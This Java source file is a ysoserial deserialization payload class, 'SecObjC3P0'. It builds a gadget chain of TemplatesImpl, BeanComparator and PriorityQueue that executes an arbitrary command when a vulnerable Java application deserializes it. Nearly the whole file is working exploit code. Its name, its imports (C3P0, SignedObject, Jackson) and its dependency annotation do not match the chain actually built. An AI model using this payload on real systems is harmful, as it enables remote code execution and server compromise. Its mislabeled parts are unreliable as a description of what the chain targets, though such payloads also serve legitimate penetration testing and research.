package ysoserial.payloads;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;
import java.security.SignedObject;
import java.util.PriorityQueue;

import static ysoserial.payloads.util.Gadgets.createSignedObject;
import static ysoserial.payloads.util.Gadgets.createTemplatesImpl;
import static ysoserial.payloads.util.Reflections.setFieldValue;

@SuppressWarnings({"rawtypes", "unchecked", "restriction"})
@Dependencies("jackson:jackson")
@Authors({ Authors.J1an })
public class SecObjC3P0 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject(final String command) throws Exception {
        Object obj =createTemplatesImpl(command);

        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, null});

        return queue;

    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(SecObjC3P0.class, args);
    }
}
